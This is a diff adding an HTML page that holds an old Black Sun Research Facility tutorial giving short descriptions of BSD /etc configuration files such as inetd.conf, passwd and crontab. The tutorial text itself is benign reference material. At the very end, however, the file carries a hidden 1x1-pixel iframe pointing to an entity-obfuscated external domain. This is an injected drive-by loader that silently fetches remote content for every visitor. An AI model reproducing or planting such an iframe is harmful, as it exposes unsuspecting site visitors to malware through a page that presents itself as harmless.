@@ -1,0 +1,269 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<title>1</title>
+</head>
+
+<body>
+
+<br>
+<br>
+<table cellSpacing="2" cellPadding="2" width="680" align="center" border="0">
+  <tbody>
+    <tr>
+      <td width="693">
+        <pre>                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a target="_blank" href="http://blacksun.box.sk">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I   <b>Common files of the /etc</b>  I   Written by:     /
+    /                     I   <b>directory and their uses </b> I                   \ 
+   /   <a href="mailto:digitalfallout@boxnetwork.net">Digital Fallout</a>    I_____________________________I  <a href="mailto:digitalfallout@boxnetwork.net">Digital Fallout</a>   \
+  /___________________________&gt;version 1.0, 7/12/2001&lt;________________________\</pre>
+    
+      </td>
+    </tr>
+  </tbody>
+</table>
+&nbsp;
+<p>&nbsp;</p>
+
+
+<p>
+
+<font SIZE="2">
+1.0 Introduction<br>
+1.1 About this tutorial<BR>
+1.2 About the Author<BR>
+1.3 Opening Notes<BR>
+<br>
+2.0 Basic Unix File System<BR>
+2.1 ETC<BR>
+2.2 Everything Else<BR>
+<br>
+3.0 Final Notes<BR>
+<br>
+4.0 Files<br>
+<br>
+4.1 Internet Related<br>
+4.1.1 ftpusers<br>
+4.1.2 services<br>
+4.1.3 netstart<br>
+4.1.4 networks<br>
+4.1.5 hosts.allow<br>
+4.1.6 hosts.equiv<br>
+4.1.7 hosts.lpd<br>
+4.1.8 hosts.deny<br>
+4.1.9 inetd.conf<br>
+4.2 System Related<br>
+4.2.1 resolv.conf<br>
+4.2.2 modems<br>
+4.2.3 motd<br>
+4.2.4 aliases<br>
+4.2.5 shells<br>
+4.2.6 hosts<br>
+4.2.7 auth.conf<br>
+4.2.8 newsyslog.conf<br>
+4.2.9 crontab<br>
+4.2.10 csh.login<br>
+4.2.11 csh.logout<br>
+4.2.12 syslog.conf<br>
+4.2.13 dhclient.conf<br>
+4.2.14 phones<br>
+4.2.15 fstab<br>
+4.2.16 login.conf<br>
+4.2.17 usbd.conf<br>
+4.2.18 login.access<br>
+4.2.19 dm.conf<br>
+4.2.20 ttys<br>
+<br>
+4.3 User Related<br>
+4.3.1 master.passwd<br>
+4.3.2 adduser.conf<br>
+4.3.3 adduser.message<br>
+4.3.4 group<br>
+4.3.5 passwd<br>
+5.0 Closing Notes<br>
+6.0 Acknowledgments<br>
+<br>
+<font SIZE="4">
+1.0 Introduction</font>
+</p>
+<p><b>1.1 About this tutorial -</b> This is a tutorial on the files found in the
+/etc directory on UNIX systems. It is based on BSD (FreeBSD 4.2 to be exact) so
+it might not be exactly the same as your Linux, Solaris or *BSD box. However
+there should be some similarities, hopefully enough that this is useful at
+least. NOTE* It is now 1 Am, I am on very little sleep and to much caffeine,
+mistakes might happen. I will what I can to catch them but I am not responsible
+if anything from this tutorial (or anything else) happens to damage your operating
+system, you, or your pet dog Fluffy.</p>
+<p><b>1.2 About the Author - </b>I ( Digital Fallout ) work an an ISP where I
+have the privilege to work on a variety of computers including UNIX. Some people call
+me a hacker, some call me weird, both terms are fine my me. I consider myself
+just a geek
+who happens to like UNIX and probably knows a bit more than yourself, that all. I am not some UNIX gift from god, I just find it
+interesting.</p>
+<b>
+<p>1.3 Opening Notes - </b>Like I said earlier, I am not responsible for
+anything that may become from this tutorial. It is your computer, these are just
+my thoughts/ideas. I don't can can't grantee the accuracy of all the
+information in this tutorial. As errors become apparent, I will revise and re-release
+it to make it a more resourceful document. Again, mess with these files at your own risk, there is a reason
+you need to be root to mess with these files.</p>
+<p>&nbsp;</p>
+<font SIZE="4">
+<p>2.0 Basic Unix File System</p>
+<p></font><b>2.1 ETC - </b>The files located in the /etc directory of UNIX are
+mostly made up of configuration and system information files. That makes these files
+very important. Do not edit them unless you know what you are doing. I have had to
+reinstall Linux many a times because some change I made locked me out of my own
+system.</p>
+<b>
+<p>2.2 Everything Else - </b>I am more than aware of the rest of the UNIX file
+system but there is simply to much to go over in this tutorial. Perhaps I will
+create other tutorials to go over these files but for now, reference your
+documentation, that can explain things better than I ever will be able to.</p>
+<font SIZE="2">
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+</font><font SIZE="4">
+<p>3.0 Final Notes</p>
+</font>
+<p>Following are descriptions of specific files grouped by their basic function.
+Some are extremely detailed wile others are barely mentioned. This if for three
+reasons. #1, it isn't that important of a file for what you will probably be
+doing. That is, you probably wont mess with it regardless of wither or not you
+know what it does. And #2 is that I am not&nbsp; knowledgeable about that
+file. Yes, I still have allot to learn about UNIX, I am just trying to help you
+out with what knowledge I do have. And Finally, #3, maybe it is just that simple
+:) Also, for more information about most ( if not all ) of these files, look at
+the man pages associated with these files. Time man &lt;file name&gt; or man man
+for more information about the man command. ( get all of that? ).</p>
+<p>&nbsp;</p>
+<font SIZE="4">
+<p>4.0 Files</p>
+<p>4.1 </font><b>Internet Related</p>
+<p>4.1.1 ftpusers - </b>This is a file that will list all users that are not
+allowed to access the FTP server. Some users/daemons are added by default such
+as BIND, games, and pop.</p>
+<p><b>4.1.2 services - </b>This file lists a complete ( if not near-complete )
+set of services and what ports they run on. Examples are FTP, HTTP, and finger.</p>
+<p><b>4.1.3 netstart - </b>Netstart is an obsolete file ( made so by rc.network
+) but is still installed in case you would like to start the network manually in
+case for example, you are in single user mode.</p>
+<font SIZE="2">
+<p></font><b>4.1.4 networks -</b> Networks holds a database of your local
+networks</p>
+<p><b>4.1.5 hosts.allow - </b>Used for IP chains and TCP wrappers, this file contains
+the rules that would allow a computer to connect.</p>
+<p><b>4.1.6 hosts.equiv - </b>This file contains a database of trusted hosts and
+users</font>
+
+<font SIZE="2">
+that you would allow to connect to your computer.</p>
+<p><b>4.1.7 hosts.lpd - </b>This file has a list of hostnames and IP addresses
+that are allowed to use your print services.</p>
+<p><b>4.1.8 inetd.conf -</b>This file contains all the daemons your computer has
+running ( and ones that have been disables ). It is a prime target for hackers because this
+is the file that UNIX checks to see what it should do with a connection
+on a given port ( Sendmail, POP3, FTP).</p>
+<p><b>4.1.8 hosts.deny -</b>This file is used by the IP rule set to decide what
+hosts to block access to the computer</p>
+<p>&nbsp;</p>
+<p><b>4.2 System Related</p>
+<p>4.2.1 resolv.conf - </b>This file has a list of your DNS servers used for
+resolving host names to IP addresses.</p>
+<p><b>4.2.2 modems - </b>This is the modem configuration database.</p>
+<p><b>4.2.3 motd - </b>See that text that scrolls by when you login? Look
+Familiar? It is the same text as in the motd file. By editing this file, you can
+change what text users see when they log onto your system.</p>
+<p><b>4.2.4 aliases - </b>This file contains all the aliases used by sendmail.
+The file actually exists in /etc/mail but is linked to /etc for convince.</p>
+<p><b>4.2.5 shells - </b>The shell database exists in the file. All shells
+installed on your system will appear in this file. Also note that any user not
+using one of these shells is not allowed to FTP into the server.</p>
+<p><b>4.2.6 hosts - </b>This file contains all the known hosts on the network.</p>
+<p><b>4.2.7 auth.conf - </b>This file configures the kind of authentication that
+UNIX should use.</p>
+<p><b>4.2.8 newsyslog.conf - </b>Configuration file for newsyslog</p>
+<p><b>4.2.9 crontab - </b>Crontab is used to schedule tasks to repeat at a given
+interval. Crontab has fields for minutes, hours, days, and months.</p>
+<p><b>4.2.10 csh.login - </b>This is the system wide .login file for the csh
+shell</p>
+<p><b>4.2.11 csh.logout - </b>As you may have guessed, this is the system wide
+logout file for the csh shell. ( Surprise! )</p>
+<p><b>4.2.12 syslog.conf - </b>This is the configuration file for the syslog
+program.</p>
+<p><b>4.2.13 dhclient.conf - </b>A required configuration file for the ISC DHCP
+client, an empty or completely remarked file indicates default configuration,</p>
+<p><b>4.2.14 phones - </b>This file holds the remote host number database</p>
+<p><b>4.2.15 fstab - </b>Fstab contains the system partition configuration with
+mount points, file type, options, and dump.</p>
+<p><b>4.2.16 login.conf - </b>This is the<b> </b><font FACE="Times New Roman">login
+class capability database</p>
+<p><b>4.2.17 usbd.conf -</b> The usbd.conf file is the configuration file for
+the USB daemon.</p>
+<p><b>4.2.18 login.access -</b> This is the login access control table</p>
+<p><b>4.2.19 dm.conf - </b>The configuration file for the dm program.</p>
+<p><b>4.2.20 ttys - </b>This is the terminal initialization information and is
+used by some routines to use special files for the terminal,.</p>
+<p><b>4.3 User Related</p>
+<p>4.3.1 master.passwd - </b>This file looks allot like the normal passwd file
+except<br>
+it has the encrypted passwords in the second field</p>
+<p><b>4.3.2 adduser.conf - </b>This is the configuration file for the adduser
+script used<br>
+to add user accounts.</p>
+<p><b>4.3.3 adduser.message -</b> This is the message you can select to send to
+new<br>
+users when they first login.</p>
+<p><b>4.3.4 group -</b> This is the database containing all the groups on your
+system and who belongs in each group.</p>
+<p><b>4.3.5 passwd -</b> This is the user database ( minus the password ) It is a
+very important file and should be backed up regularly and check for compromises.</p>
+<p>&nbsp;</p>
+</font><font FACE="Times New Roman" SIZE="4">
+<p>5.0 Closing Notes<br>
+</font><font FACE="Times New Roman">I know this looks more like a reference guide than a tutorial but that is how I wanted it to be. I wanted this text to
+be used &quot;on the spot&quot; so you can pick what files you need to know
+about. If I decide to make further editions of this text I will include more
+Linux type files in addition to the BSD ones you already see here. I am sure you see a
+resemblance between my descriptions and the man pages for these
+files. Good, that means you are doing some research by yourself, you learn
+better that way anyways :)</p>
+<p>&nbsp;</p>
+</font><font SIZE="4">
+<p>6.0 </font></font><font size="4">Acknowledgments</font></p>
+
+<font SIZE="2">
+<p>Thanks to everybody who hangs out in the #BSRF chartroom ( irc.box.sk )
+and The Black Sun Research Facility ( even though I help run it ) for giving me
+someplace to publish this work. Special thanks goes out to Mikkkeee for helping
+out with BSRF, Cyberwolf for the same reasons, AZTEK for helping me with all my
+stupid PHP questions, Kript0n for just being cool :), Matt, RedShadow, ElfQrin,
+Ghost Rider, and caboom for just being themselves. And finally MAJOR thanks
+need to go out to cube from Box Network for without him there would be no Black
+Sun or any other great opportunities he gives out. Thanks to you man :)</p>
+<p><a target="_blank" href="http://blacksun.box.sk">http://blacksun.box.sk</a></p>
+<p><a href="http://www.boxnetwork.net">http://www.boxnetwork.net</a></p>
+<font SIZE="2">
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+</font>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+
+</html>
